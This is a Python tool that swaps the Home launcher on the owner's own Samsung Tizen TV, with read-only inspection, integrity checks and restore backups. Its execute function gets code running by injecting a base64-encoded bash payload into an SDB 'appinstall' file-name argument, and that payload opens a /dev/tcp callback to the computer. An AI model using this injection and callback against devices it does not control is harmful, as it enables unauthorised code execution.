"""Owner-specific native Home tooling. Prepare/query are read-only on the TV.

Apply/restore use undocumented Samsung APIs. Keep the complete recovery folder.
The reference owner's runner, identity, firmware guards and baseline are unused.
"""
import argparse
import base64
import hashlib
import ipaddress
import json
import os
from pathlib import Path
import platform
import re
import shutil
import socket
import subprocess
import tarfile
import time
import urllib.request
import uuid

SOURCE = Path(__file__).resolve().parent
STRINGS = ('db/appfw/home_appid', 'db/appfw/startup_appid',
           'db/appfw/booting_appid_backup', 'db/first_screen/type')
AUTO = 'db/menu/smart_hub/ontvsetting/auto_start'
FILES = ('personal-home.py', 'PersonalControl.cs', 'PersonalControl.csproj')
OUTPUTS = tuple('out/ParamHomeControl.' + suffix for suffix in
                ('dll', 'deps.json', 'runtimeconfig.json'))
SDK_VERSION = '6.0.428'
# Official Microsoft 6.0 release metadata, independently checked during review.
SDK_HASHES = {
    ('Darwin', 'arm64'): ('osx-arm64', 'b60e74b56efc5bdb05be9c954bca6fddbc6baa79213b120fd803c75252c54cf4a6f45255b532c18ceae8c4c1c2a60d2702309156f9ab1436bd71f68947c37215'),
    ('Linux', 'x86_64'): ('linux-x64', '04395f991ab50e4755ce1ae53e23592a7420b71b82160883bae3194dd1dfd5dcaed78743e4e0b4dd51ea43c49ec84b5643630707b3854f1471265dc98490d2f9'),
}


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def digest(path, algorithm='sha256'):
    result = hashlib.new(algorithm)
    with path.open('rb') as source:
        for chunk in iter(lambda: source.read(1024 * 1024), b''):
            result.update(chunk)
    return result.hexdigest()


def save_new(path, value):
    # Never replace a baseline or previously saved configuration.
    with path.open('x') as output:
        output.write(json.dumps(value, indent=2) + '\n')
    path.chmod(0o600)


def parse_inspection(text, app_id):
    require('PARAMHOME_INSPECT_BEGIN' in text and 'PARAMHOME_INSPECT_END' in text,
            'Incomplete inspection report.')
    require('uid=901(sdk)' in text and re.search(r'^armv7l\s*$', text, re.M),
            'Expected the inspected ARMv7 SDK user.')
    require('/usr/share/dotnet/shared/Microsoft.NETCore.App/6.0.' in text,
            'Required TV .NET 6 runtime was not found.')
    fields = {}
    for name in ('Model', 'Version'):
        match = re.search(r'^' + name + r'=([A-Za-z0-9_.-]+);\s*$', text, re.M)
        require(match is not None, 'Missing inspected ' + name)
        fields[name] = match.group(1)
    strings = {}
    for key in STRINGS:
        match = re.search(r'^' + re.escape(key) + r', value = ([^\r\n]+) \(String\)\s*$', text, re.M)
        require(match is not None, 'Missing typed original preference ' + key)
        strings[key] = match.group(1)
        require(strings[key] != app_id, 'Inspection already names the custom launcher; original baseline required.')
    match = re.search(r'^' + re.escape(AUTO) + r', value = ([01]) \(Int32\)\s*$', text, re.M)
    require(match is not None, 'Missing typed autostart preference.')
    return ({'AppId': app_id, 'Firmware': fields['Version'], 'Model': fields['Model']},
            strings, int(match.group(1)))


def build(root, download_sdk):
    for name in FILES:
        source, target = SOURCE / name, root / name
        if source.resolve() != target.resolve():
            require(not target.exists() or target.read_bytes() == source.read_bytes(),
                    'Recovery source differs; preserve the existing folder before updating: ' + name)
            if not target.exists():
                shutil.copy2(source, target)
    sdk_dir = root / 'dotnet-sdk'
    dotnet = sdk_dir / 'dotnet'
    if not dotnet.exists():
        require(download_sdk, 'Pass --download-sdk to install a verified private build SDK in the recovery folder.')
        package = SDK_HASHES.get((platform.system(), platform.machine()))
        require(package is not None, 'No reviewed compiler download for this computer.')
        rid, sha512 = package
        url = ('https://builds.dotnet.microsoft.com/dotnet/Sdk/' + SDK_VERSION
               + '/dotnet-sdk-' + SDK_VERSION + '-' + rid + '.tar.gz')
        archive = root / ('dotnet-sdk-' + SDK_VERSION + '-' + rid + '.tar.gz')
        if not archive.exists() or digest(archive, 'sha512') != sha512:
            print('Downloading Microsoft .NET build SDK into the private recovery folder (about 200 MB)...', flush=True)
            partial = archive.with_suffix('.partial')
            with urllib.request.urlopen(url, timeout=60) as response, partial.open('wb') as output:
                shutil.copyfileobj(response, output)
            require(digest(partial, 'sha512') == sha512, 'Microsoft SDK SHA-512 mismatch; not extracted.')
            partial.replace(archive)
        sdk_dir.mkdir(mode=0o700, exist_ok=True)
        with tarfile.open(archive) as bundle:
            # Python 3.9-compatible traversal/link validation before using system tar.
            for member in bundle.getmembers():
                destination = (sdk_dir / member.name).resolve()
                require(destination == sdk_dir.resolve() or sdk_dir.resolve() in destination.parents,
                        'SDK archive path escapes extraction folder.')
                require(member.isfile() or member.isdir() or member.issym() or member.islnk(),
                        'Unsupported SDK archive member.')
                if member.issym() or member.islnk():
                    link = ((destination.parent if member.issym() else sdk_dir) / member.linkname).resolve()
                    require(link == sdk_dir.resolve() or sdk_dir.resolve() in link.parents,
                            'SDK archive link escapes extraction folder.')
        subprocess.run(['tar', '-xzf', str(archive), '-C', str(sdk_dir)], check=True, timeout=120)
    environment = os.environ.copy()
    environment.update({'DOTNET_ROOT': str(sdk_dir), 'DOTNET_CLI_HOME': str(root / 'cli'),
                        'XDG_DATA_HOME': str(root / 'tool-data'),
                        'NUGET_PACKAGES': str(root / 'nuget-packages'),
                        'NUGET_HTTP_CACHE_PATH': str(root / 'nuget-cache'),
                        'DOTNET_GENERATE_ASPNET_CERTIFICATE': '0',
                        'DOTNET_ADD_GLOBAL_TOOLS_TO_PATH': '0', 'DOTNET_MULTILEVEL_LOOKUP': '0',
                        'DOTNET_CLI_TELEMETRY_OPTOUT': '1', 'DOTNET_SKIP_FIRST_TIME_EXPERIENCE': '1',
                        'DOTNET_NOLOGO': '1'})
    print('Building the one-shot helper. No TV settings are being changed.', flush=True)
    subprocess.run([str(dotnet), 'build', str(root / 'PersonalControl.csproj'), '-c', 'Release',
                    '--nologo', '-p:BaseIntermediateOutputPath=' + str(root / 'obj') + '/',
                    '-o', str(root / 'out')], env=environment, check=True, timeout=180)
    require(all((root / name).is_file() for name in OUTPUTS), 'Incomplete compiler output.')


def verify_bundle(root):
    manifest = json.loads((root / 'integrity.json').read_text())
    require(set(manifest) == set(FILES + OUTPUTS + ('owner.json', 'original.json')),
            'Incomplete recovery integrity manifest.')
    for name, expected in manifest.items():
        require((root / name).is_file() and digest(root / name) == expected,
                'Recovery file changed; stop for review: ' + name)


def execute(root, owner, action):
    sdb_path = owner['Sdb']
    host = owner['Host']
    ipaddress.IPv4Address(host)
    serial = host + ':26101'

    def sdb(*command):
        result = subprocess.run([sdb_path, *command], capture_output=True, text=True, timeout=25)
        require(result.returncode == 0, 'SDB failed: ' + (result.stdout + result.stderr)[-1000:])
        return result.stdout + result.stderr

    sdb('connect', serial)
    capabilities = sdb('-s', serial, 'capability')
    for line in ('vendor_name:Samsung', 'platform_version:9.0', 'cpu_arch:armv7'):
        require(line in capabilities.splitlines(), 'TV capability changed; nothing staged.')
    if action != 'restore':
        apps = sdb('-s', serial, 'shell', '0', 'applist')
        require("'" + owner['Device']['AppId'] + "'" in apps, 'Launcher not installed; nothing staged.')
    token = uuid.uuid4().hex[:12]
    prefix = '/home/owner/share/tmp/sdk_tools/ph-' + token
    for suffix in ('dll', 'deps.json', 'runtimeconfig.json'):
        sdb('-s', serial, 'push', str(root / 'out' / ('ParamHomeControl.' + suffix)), prefix + '.' + suffix)
    device_path = root / ('device-' + token + '.json')
    save_new(device_path, owner['Device'])
    sdb('-s', serial, 'push', str(device_path), prefix + '-device.json')
    invocation = '/usr/bin/dotnet ' + prefix + '.dll ' + action + ' ' + prefix + '-device.json'
    if action != 'query':
        sdb('-s', serial, 'push', str(root / 'original.json'), prefix + '-original.json')
        invocation += ' ' + prefix + '-original.json'
    start, finish = 'PARAMHOME_CONTROL_BEGIN_' + token, 'PARAMHOME_CONTROL_END_' + token
    script = 'set -u\nprintf "' + start + '\\n"\n' + invocation
    script += '\nresult=$?\nprintf "' + finish + ':%s\\n" "$result"\n'
    local_script = root / ('command-' + token + '.sh')
    local_script.write_text(script)
    local_script.chmod(0o600)
    sdb('-s', serial, 'push', str(local_script), prefix + '.sh')
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        local_ip = route.getsockname()[0]
    with socket.socket() as listener:
        listener.bind((local_ip, 0))
        listener.listen(1)
        listener.settimeout(25)
        command = ('exec 3<>/dev/tcp/' + local_ip + '/' + str(listener.getsockname()[1])
                   + ';cat ' + prefix + '.sh|bash >&3 2>&3;exec 3>&-')
        shell = '/bin/mkdir /tmp/ph-' + token + ' 2>/dev/null&&{ ' + command + ';}'
        encoded = base64.b64encode(shell.encode()).decode()
        argument = '0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
        require(len(argument.encode()) <= 400, 'SDK transport exceeds reviewed length.')
        print('Running native ' + action + ' on the TV...', flush=True)
        process = subprocess.Popen([sdb_path, '-s', serial, 'shell', argument],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        received = bytearray()
        try:
            connection, peer = listener.accept()
            with connection:
                require(peer[0] == host, 'Unexpected callback peer.')
                connection.settimeout(15)
                deadline = time.monotonic() + 40
                while True:
                    require(time.monotonic() < deadline, 'Native result exceeded time limit.')
                    chunk = connection.recv(16384)
                    if not chunk:
                        break
                    received.extend(chunk)
                    require(len(received) <= 100000, 'Native result exceeded size limit.')
        finally:
            if process.poll() is None:
                process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=5)
            report = root / (action + '-' + token + '.txt')
            report.write_text(received.decode(errors='replace'))
            report.chmod(0o600)
        output = received.decode(errors='replace')
        print(output)
        require(start in output and finish + ':0' in output.splitlines(),
                'Native operation failed or result is incomplete. Do not repeat apply; query and review ' + str(report))
    marker = 'PARAMHOME_' + {'query': 'QUERY', 'apply': 'APPLIED', 'restore': 'RESTORED'}[action] + '='
    matches = [line[len(marker):] for line in output.splitlines() if line.startswith(marker)]
    require(len(matches) == 1, 'Missing native readback; state needs review.')
    value = json.loads(matches[0])
    require(value['Device'] == owner['Device'] and value['Uid'] == 901,
            'Native result identity differs; state needs review.')
    return value


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('action', choices=('prepare', 'query', 'apply', 'restore', 'build'))
    parser.add_argument('--recovery-dir', type=Path,
                        default=SOURCE if (SOURCE / 'owner.json').exists() else Path.home() / 'ParamHome-recovery')
    parser.add_argument('--host')
    parser.add_argument('--app-id')
    parser.add_argument('--inspection', type=Path)
    parser.add_argument('--sdb', type=Path)
    parser.add_argument('--download-sdk', action='store_true')
    args = parser.parse_args()
    root = args.recovery_dir.expanduser().resolve()
    root.mkdir(parents=True, exist_ok=True, mode=0o700)
    if args.action == 'build':
        require(not (root / 'integrity.json').exists(), 'Do not rebuild an existing recovery bundle.')
        build(root, args.download_sdk)
        return
    if args.action == 'prepare':
        require(args.host and args.app_id and args.inspection, 'Prepare requires --host, --app-id and --inspection.')
        address = ipaddress.IPv4Address(args.host)
        require(not address.is_unspecified and not address.is_multicast, 'Invalid TV address.')
        require(re.fullmatch(r'[A-Za-z0-9]{10}\.[A-Za-z0-9_]+', args.app_id), 'Invalid SDK application ID.')
        sdb_path = args.sdb or Path.home() / 'tizen-studio/tools/sdb'
        require(sdb_path.is_file(), 'SDB not found: ' + str(sdb_path))
        device, strings, autostart = parse_inspection(args.inspection.read_text(), args.app_id)
        owner = {'Host': args.host, 'Sdb': str(sdb_path.resolve()), 'Device': device,
                 'ExpectedStrings': strings, 'ExpectedAutostart': autostart}
        config = root / 'owner.json'
        if config.exists():
            require(json.loads(config.read_text()) == owner, 'Recovery folder belongs to another configuration.')
        else:
            save_new(config, owner)
        if (root / 'integrity.json').exists():
            verify_bundle(root)
            print('Original recovery bundle already exists and passed integrity checks; not replaced.')
            return
        build(root, args.download_sdk)
        snapshot = execute(root, owner, 'query')
        require(snapshot['BootSupported'] == 1, 'ParamHome is not eligible for native startup; no settings changed.')
        require(snapshot['Home'] != device['AppId'] and snapshot['Home'], 'Original native Home was not captured.')
        require(snapshot['Strings'] == strings and snapshot['Autostart'] == autostart,
                'Preferences changed since inspection; do not capture an uncertain baseline.')
        if (root / 'original.json').exists():
            require(json.loads((root / 'original.json').read_text()) == snapshot,
                    'Existing originals differ; never overwrite them.')
        else:
            save_new(root / 'original.json', snapshot)
        manifest = {name: digest(root / name) for name in FILES + OUTPUTS + ('owner.json', 'original.json')}
        save_new(root / 'integrity.json', manifest)
        instructions = ('Preserve this entire folder. Restore before uninstalling ParamHome or changing its app ID.\n'
                        'Run using this folder: python3 personal-home.py query / apply / restore\n'
                        'All three commands re-stage their temporary files. A firmware change stops the helper.\n'
                        'After an uncertain apply result, query and review; never repeat apply blindly.\n'
                        'Verify physical Home after restore, and again after reapply. Test startup separately.\n')
        (root / 'RECOVERY.txt').write_text(instructions)
        backup = root.parent / ('ParamHome-recovery-backup-' + uuid.uuid4().hex[:12])
        backup.mkdir(mode=0o700)
        for name in tuple(manifest) + ('integrity.json', 'RECOVERY.txt'):
            target = backup / name
            target.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
            shutil.copy2(root / name, target)
        verify_bundle(backup)
        print('READ-ONLY PREPARATION COMPLETE. No Home/startup settings changed.')
        print('Native Home: ' + snapshot['Home'] + '; startup eligibility: ' + str(snapshot['BootSupported']))
        print('Original snapshot: ' + str(root / 'original.json'))
        print('Independent recovery backup: ' + str(backup))
        print('Restore command: python3 "' + str(root / 'personal-home.py') + '" restore')
        return
    owner = json.loads((root / 'owner.json').read_text())
    if args.action != 'query':
        verify_bundle(root)
    elif (root / 'integrity.json').exists():
        verify_bundle(root)
    # Network/tool paths may change; overrides never modify the saved originals.
    if args.host:
        address = ipaddress.IPv4Address(args.host)
        require(not address.is_unspecified and not address.is_multicast, 'Invalid TV address.')
        owner['Host'] = args.host
    if args.sdb:
        require(args.sdb.is_file(), 'SDB override does not exist.')
        owner['Sdb'] = str(args.sdb.resolve())
    value = execute(root, owner, args.action)
    print('Verified native ' + args.action + ' readback. Physical TV behaviour still needs observation.')


if __name__ == '__main__':
    try:
        main()
    except (OSError, ValueError, KeyError, RuntimeError, subprocess.SubprocessError) as error:
        raise SystemExit('Stopped: ' + str(error))
